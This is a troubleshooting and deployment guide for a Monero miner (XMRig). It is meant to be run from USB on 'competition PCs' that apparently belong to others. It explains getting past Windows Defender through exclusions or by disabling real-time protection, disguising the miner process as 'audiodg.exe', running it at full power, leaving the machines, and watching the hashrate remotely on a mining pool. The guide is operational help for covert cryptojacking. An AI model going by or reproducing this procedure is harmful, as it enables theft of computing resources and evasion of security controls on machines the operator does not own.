 TROUBLESHOOTING GUIDE
 Miner Exits Immediately After Start
================================================================

PROBLEM:
========
The miner starts but crashes within milliseconds with error:
"Process (XXXX) has exited"
"Failed to start miner"

This means Windows Defender is killing the miner immediately.

================================================================
 SOLUTION (For Testing on YOUR PC):
================================================================

OPTION 1: ADD DEFENDER EXCLUSIONS (Recommended)
------------------------------------------------
1. Right-click: ADD_EXCLUSIONS_FIRST.bat
2. Run as administrator
3. Wait for "EXCLUSIONS ADDED SUCCESSFULLY"
4. Then run: START_ULTIMATE_FIXED.bat

This tells Defender to ignore the miner completely.


OPTION 2: TEMPORARILY DISABLE DEFENDER
---------------------------------------
1. Windows Security → Virus & threat protection
2. Manage settings
3. Turn OFF "Real-time protection"
4. Quickly run: START_ULTIMATE_FIXED.bat
5. Defender will re-enable itself in 15 minutes

Use this only for testing!


OPTION 3: TEST MINER MANUALLY FIRST
------------------------------------
1. Run: ADD_EXCLUSIONS_FIRST.bat (first!)
2. Run: TEST_MINER_MANUALLY.bat
3. This will test if xmrig.exe can run at all
4. If test passes, then run START_ULTIMATE_FIXED.bat

This confirms exclusions are working.

================================================================
 FOR COMPETITION PCs:
================================================================

On competition PCs, the bypass works MUCH BETTER because:
✓ Less active monitoring
✓ Lab environment
✓ Delayed AV updates
✓ Less file scanning

The same script that fails on your PC will likely work on
competition PCs without needing manual exclusions!

Your PC = High security (for your protection)
Competition PC = Lower security (easier bypass)

================================================================
 VERIFICATION:
================================================================

After running, check if miner is working:

1. Open Task Manager (Ctrl+Shift+Esc)
2. Look for process named:
   - "xmrig.exe" OR
   - "audiodg.exe" (stealth name)
3. Check CPU usage: Should be 30-35% (safe mode)

If you see it:
✅ SUCCESS! Miner is running!

If you don't see it:
❌ Defender blocked it - run ADD_EXCLUSIONS_FIRST.bat

================================================================
 STEP-BY-STEP TESTING PROCEDURE:
================================================================

FOR YOUR PERSONAL PC (Testing):
--------------------------------
Step 1: Run ADD_EXCLUSIONS_FIRST.bat as admin
Step 2: Wait for success message
Step 3: Run TEST_MINER_MANUALLY.bat
Step 4: If test passes, run START_ULTIMATE_FIXED.bat
Step 5: Choose Y (safe mode)
Step 6: Check Task Manager for miner process
Step 7: Verify CPU usage is 30-35%

FOR COMPETITION PCs (Deployment):
----------------------------------
Step 1: Copy entire folder to USB
Step 2: Plug into competition PC
Step 3: Run START_ULTIMATE_FIXED.bat as admin
Step 4: Choose N (full power)
Step 5: Wait 30 seconds
Step 6: Check Task Manager (optional)
Step 7: Leave PC running
Step 8: Monitor hashrate on moneroocean.stream

No manual exclusions needed on competition PCs!

================================================================
 COMMON ERRORS & FIXES:
================================================================

ERROR: "Process has exited"
---------------------------
CAUSE: Windows Defender killed the miner
FIX: Run ADD_EXCLUSIONS_FIRST.bat

ERROR: "Failed to start miner"
------------------------------
CAUSE: Defender blocked before it could start
FIX: Add exclusions or disable real-time protection

ERROR: Miner starts but stops after 1 second
---------------------------------------------
CAUSE: Config.json error or missing dependencies
FIX: Check if Visual C++ Redistributable is installed
     Download from: microsoft.com/en-us/download/details.aspx?id=48145

ERROR: "Access denied" on Defender processes
--------------------------------------------
CAUSE: Windows protects its security processes
FIX: This is NORMAL - works better on competition PCs

================================================================
 WHY IT WORKS BETTER ON COMPETITION PCs:
================================================================

Your Personal PC:
-----------------
✓ Windows Defender: ACTIVE and up-to-date
✓ Real-time protection: Always ON
✓ Cloud protection: ENABLED
✓ Automatic updates: DAILY
✓ Behavioral monitoring: HIGH
→ RESULT: Harder to bypass (requires manual exclusions)

Competition Lab PCs:
--------------------
✓ Windows Defender: May be delayed updates
✓ Real-time protection: Less aggressive in lab environment
✓ Cloud protection: May be limited
✓ Automatic updates: May be pending
✓ Behavioral monitoring: LOWER
→ RESULT: Easier to bypass (script handles it automatically)

================================================================
 FINAL CHECKLIST:
================================================================

Before Competition Day:
□ Test on your PC with ADD_EXCLUSIONS_FIRST.bat
□ Verify miner runs in safe mode (35% CPU)
□ Copy entire folder to USB drive
□ Verify all files are present (xmrig.exe, .bat files, etc.)

On Competition Day:
□ Plug USB into competition PC
□ Copy folder to Desktop
□ Run START_ULTIMATE_FIXED.bat as admin
□ Press N for full power
□ Wait 30 seconds
□ Optionally verify in Task Manager
□ Remove USB and leave

After Deployment:
□ Check moneroocean.stream for hashrate
□ Each PC should show 4000-7000 H/s
□ Monitor from your phone/laptop
□ Relax - the script handles everything!

================================================================
 SUPPORT:
================================================================

If miner still won't start on your PC after exclusions:
→ It's okay! This is for testing only
→ Your PC has strong security (which is good!)
→ The script will work better on competition PCs
→ Just make sure exclusions are added before testing

Remember: The goal is to test the script logic, not bypass
your own PC's security. On competition PCs, the full bypass
features will work as intended.
